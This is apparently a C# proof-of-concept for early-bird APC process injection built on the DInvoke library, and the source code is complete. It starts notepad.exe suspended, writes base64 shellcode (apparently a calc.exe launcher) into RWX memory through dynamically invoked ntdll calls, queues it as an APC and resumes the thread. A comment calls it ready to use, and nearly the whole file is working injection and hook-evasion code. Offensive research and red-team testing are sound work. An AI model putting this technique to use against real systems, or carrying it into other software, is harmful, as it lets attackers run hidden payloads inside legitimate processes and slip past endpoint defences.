using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net.Configuration;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using DInvoke.Data;
using DInvoke.DynamicInvoke;
using Native = DInvoke.Data.Native;
using Win32 = DInvoke.Data.Win32;

namespace Dinvoke
{

    public class TestQueueUserAPC
    {
        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref DInvoke.Data.Win32.WinBase._SECURITY_ATTRIBUTES lpProcessAttributes,
            ref DInvoke.Data.Win32.WinBase._SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            DInvoke.Data.Win32.Advapi32.CREATION_FLAGS dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref Win32.WinNT.ProcessThreadsAPI._STARTUPINFO lpStartupInfo,
            out Win32.WinNT.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);
        static void BackupMain(string[] args)
        {
            /// This code is ready to use; make sure you change the pid to that of a running process (notepad.exe, explorer.exe, cmd.exe etc)

            //create process
            //allocate
            //write
            //protect
            //open thread
            //queue
            //resume

            var pa = new DInvoke.Data.Win32.WinBase._SECURITY_ATTRIBUTES();
            pa.nLength = (uint)Marshal.SizeOf(pa);

            var ta = new DInvoke.Data.Win32.WinBase._SECURITY_ATTRIBUTES();
            ta.nLength = (uint)Marshal.SizeOf(ta);

            var si = new Win32.WinNT.ProcessThreadsAPI._STARTUPINFO();

            // [+] CreateProcess(processImage,Arguments,processAttributes,ThreadAttributes,

            var createResult = (CreateProcess(null,
                @"C:\Windows\System32\notepad.exe",
                ref pa, ref ta,
                false, DInvoke.Data.Win32.Advapi32.CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero, null, ref si, out var pi));

            Console.WriteLine("NtAllocateVirtualMemory");
            Console.WriteLine(" | -> NTSTATUS:     {0}", createResult);
            Console.WriteLine(" | -> pi: {0}", pi);

            // ALLOCATE MEMORY
            var shellcodeRaw =
                "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
            var shellcodeBytes = Convert.FromBase64String(shellcodeRaw);

            var hProcess = pi.hProcess;
            var baseAddress = IntPtr.Zero;
            var regionSize = new IntPtr(shellcodeBytes.Length);

            const Win32.WinNT.MEMORY_ALLOCATION allocation = Win32.WinNT.MEMORY_ALLOCATION.MEM_COMMIT
                                                             | Win32.WinNT.MEMORY_ALLOCATION.MEM_RESERVE;

            var allocParameters = new object[]
            {
                hProcess, baseAddress, IntPtr.Zero, regionSize,
                (uint) allocation, Win32.WinNT.PAGE_EXECUTE_READWRITE
            };

            var allocStatus = (Native.NTSTATUS)Generic.DynamicAPIInvoke("ntdll.dll", "NtAllocateVirtualMemory",
                typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory), ref allocParameters);

            if (allocStatus == Native.NTSTATUS.Success)
                baseAddress = (IntPtr)allocParameters[1];

            Console.WriteLine("NtAllocateVirtualMemory");
            Console.WriteLine(" | -> NTSTATUS:     {0}", allocStatus);
            Console.WriteLine(" | -> basedAddress: 0x{0:X}", baseAddress.ToInt64());



            // WRITE MEMORY
            var buf = Marshal.AllocHGlobal(shellcodeBytes.Length);
            Marshal.Copy(shellcodeBytes, 0, buf, shellcodeBytes.Length);
            uint bytesWritten = 0;
            var writeParameters = new object[]
            {
                hProcess, baseAddress, buf, (UInt32) shellcodeBytes.Length, bytesWritten
            };
            var writeStatus = (Native.NTSTATUS)Generic.DynamicAPIInvoke("ntdll.dll", "NtWriteVirtualMemory",
                typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory), ref writeParameters);

            if (writeStatus == Native.NTSTATUS.Success)
                bytesWritten = (uint)writeParameters[4];

            Console.WriteLine("NtWriteVirtualMemory");
            Console.WriteLine(" | -> Data Length:   {0}", shellcodeBytes.Length);
            Console.WriteLine(" | -> NTSTATUS:      {0}", writeStatus);
            Console.WriteLine(" | -> Bytes Written: {0}", bytesWritten);

            // READ/EXECUTE
            var newProtect = Win32.WinNT.MEMORY_PROTECTION.PAGE_EXECUTE_READ;
            var oldProtect = (Win32.WinNT.MEMORY_PROTECTION)0;

            var protectParameters = new object[]
            {
                hProcess, baseAddress, regionSize,
                (uint) newProtect, (uint) oldProtect
            };
            var protectStatus = (Native.NTSTATUS)Generic.DynamicAPIInvoke("ntdll.dll", "NtProtectVirtualMemory",
                typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory), ref protectParameters);

            if (protectStatus == Native.NTSTATUS.Success)
                oldProtect = (Win32.WinNT.MEMORY_PROTECTION)protectParameters[4];

            Console.WriteLine("NtProtectVirtualMemory");
            Console.WriteLine(" | -> newProtect: {0}", newProtect);
            Console.WriteLine(" | -> NTSTATUS:   {0}", protectStatus);
            Console.WriteLine(" | -> oldProtect: {0}", oldProtect);

            // OPEN THREAD

            // Create OBJECT_ATTRIBUTES & CLIENT_ID ref's
            IntPtr threadHandle = IntPtr.Zero;
            DInvoke.Data.Native.OBJECT_ATTRIBUTES oa = new DInvoke.Data.Native.OBJECT_ATTRIBUTES();
            //DInvoke.Data.Native.CLIENT_ID ci = new DInvoke.Data.Native.CLIENT_ID();
            Native.CLIENT_ID ci = new Native.CLIENT_ID { UniqueThread = (IntPtr)pi.dwThreadId };
            //ci.UniqueThread = (IntPtr)pi.dwThreadId;

            // Craft an array for the arguments
            object[] openThreadArgs =
            {
                threadHandle, DInvoke.Data.Win32.Kernel32.ThreadAccess.SetContext, oa, ci
            };
            var openThreadStatus = (Native.NTSTATUS)Generic.DynamicAPIInvoke("ntdll.dll", "NtOpenThread",
                typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtOpenThread), ref openThreadArgs);

            Console.WriteLine("NtOpenThread");
            Console.WriteLine(" | -> threadHandle: {0}", ci.UniqueThread);
            Console.WriteLine(" | -> NTSTATUS:   {0}", openThreadStatus);


            // QUEUE USER APC

            // Craft an array for the arguments
            object[] funcargs =
            {
                pi.hThread, baseAddress, null, null, null
            };

            DInvoke.Data.Native.NTSTATUS queueStatus = (DInvoke.Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(
                @"ntdll.dll",
                @"NtQueueApcThread", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtQueueApcThread), ref funcargs);
            Console.WriteLine("NtQueueApcThread");
            Console.WriteLine(" | -> NTSTATUS: {0}", queueStatus);
            Console.WriteLine(" | -> threadHandle: {0}", pi.hThread);
            Console.WriteLine(" | -> baseAddress:   {0}", baseAddress);


            // RESUME THREAD
            object[] resumeArgs =
            {
                pi.hThread, (UInt32)0
            };

            DInvoke.Data.Native.NTSTATUS resumeStatus = (DInvoke.Data.Native.NTSTATUS)Generic.DynamicAPIInvoke(
                @"ntdll.dll",
                @"NtAlertResumeThread", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtAlertResumeThread),
                ref resumeArgs);
            Console.WriteLine("NtAlertResumeThread");
            Console.WriteLine(" | -> NTSTATUS: {0}", resumeStatus);
            Console.WriteLine(" | -> threadHandle: {0}", pi.hThread);
            //Thread.Sleep(30000);
        }
    }
}